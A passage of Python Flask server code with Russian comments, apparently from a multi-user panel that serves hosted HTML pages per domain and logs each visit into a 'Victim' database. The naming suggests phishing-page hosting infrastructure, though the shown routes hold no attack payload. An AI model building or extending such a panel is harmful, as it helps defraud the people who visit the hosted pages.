            return send_file(return_data, mimetype='application/zip')
            
        else:
            return jsonify({'status': 'error', 'message': 'Очистите куки и перезайдите в панель'})












###########################################
#                                         #
#                  404                    #
#                                         #
###########################################
@app.errorhandler(404)
async def page_not_found(e):
    return redirect(url_for('index'))








# ###########################################
# #                                         #
# #       Получить все данные домена        #
# #                                         #
# ###########################################
@app.route('/<path>', methods=['GET'])
async def path(path):
    host = request.headers.get('Host')
    try:
        url = host + '$' + path
        username = os.listdir(f'templates/domains/{url}/')[0]

        if not 'entered' in session:
            session['entered'] = True
            db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
            db_victim.AddView(host)

        return render_template(f'domains/{url}/{username}')
    except Exception as e:
        return redirect(url_for('index'))










###########################################
#                                         #
#                  Выход                  #
#                                         #
###########################################
@app.route('/logout', methods=['POST', 'GET'])
async def logout():
    if 'username' in session and session['username'] != db.GetAdmins(session['username'])[0]:
        user = db.GetUserBy('username', session['username'])[0]
        db.UpdateActivity(session['username'])
        session.pop('username')
    elif session['username'] == db.GetAdmins(session['username'])[0]:
        session.pop('username')
        
    flash(('Вы вышли из аккаунта', 'warn'), 'info')

    return redirect(url_for('login'))